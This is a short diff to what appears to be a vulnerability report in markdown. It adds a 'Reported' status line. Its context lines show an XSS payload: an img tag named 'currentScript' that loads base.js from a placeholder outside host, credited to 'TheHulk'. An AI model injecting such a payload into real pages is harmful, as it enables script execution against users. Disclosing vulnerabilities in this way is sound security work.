@@ -8,6 +8,7 @@
 + Payload: ```<img name="currentScript" src="https://xxx.xxx.xxx/base.js"></img>```
 + Impact: XSS
 + CVE: N/A
++ Status: Reported
 + Foundby: TheHulk
 
 
